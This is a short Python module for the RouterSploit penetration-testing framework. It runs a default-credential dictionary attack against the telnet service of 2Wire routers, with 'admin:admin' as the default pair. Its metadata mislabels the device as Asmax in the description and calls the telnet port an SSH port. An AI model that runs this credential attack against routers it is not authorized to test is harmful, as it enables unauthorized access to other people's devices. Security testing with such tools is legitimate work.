from routersploit.core.exploit import *

# hack to import from directory/filename starting with a number
TelnetDefault = utils.import_exploit("routersploit.modules.creds.generic.telnet_default")


class Exploit(TelnetDefault):
    __info__ = {
        "name": "2Wire Router Default Telnet Creds",
        "description": "Module performs dictionary attack against Asmax Router Telnet service. "
                       "If valid credentials are found, they are displayed to the user.",
        "authors": (
            "Marcin Bury <marcin[at]threat9.com>",  # routersploit module
        ),
        "devices": (
            "2Wire Router",
        ),
    }

    target = OptIP("", "Target IPv4, IPv6 address or file with ip:port (file://)")
    port = OptPort(23, "Target SSH port")

    threads = OptInteger(1, "Number of threads")
    defaults = OptWordlist("admin:admin", "User:Pass or file with default credentials (file://)")
